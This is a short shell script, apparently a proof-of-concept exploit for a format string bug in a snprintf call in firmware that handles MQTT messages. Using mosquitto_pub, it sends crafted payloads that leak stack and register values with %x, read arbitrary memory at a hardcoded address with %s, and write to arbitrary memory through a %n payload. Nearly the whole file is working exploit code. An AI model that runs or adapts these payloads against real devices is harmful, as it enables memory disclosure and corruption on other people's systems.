# The format string attack exists in the snprintf() function.
# The call is: snprintf(buf, sizeof(buf), event->data)
# buf is loaded into register A10.
# sizeof(buf) is loaded into A11.
# event->data is loaded into A12.
# Registers A13 - A15 (and the stack) are used for incoming arguments.

command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"

tag_addr="e82f403f"

write_addr="b07efc3f"

nl_bin=$(echo "0a0d" | xxd -p -r)

tag_addr_bin=$(echo $tag_addr | xxd -p -r)

write_addr_bin=$(echo $write_addr | xxd -p -r)

# Reading the stack
$command_prefix "READING THE STACK:"
$command_prefix "$nl_bin \
    Registers A13 - A15: %x %x %x $nl_bin \
    Stack frame: %x %x %x %x %x"

# Reading arbitrary memory
$command_prefix "READING ARIBTRARY MEMORY:"
$command_prefix "$tag_addr_bin %x %x %x %s"

# Writing arbitrary memory
$command_prefix "WRITING ARIBTRARY MEMORY:"
$command_prefix "$write_addr_bin%08x%08x%4473134x%n $nl_bin %4\$s"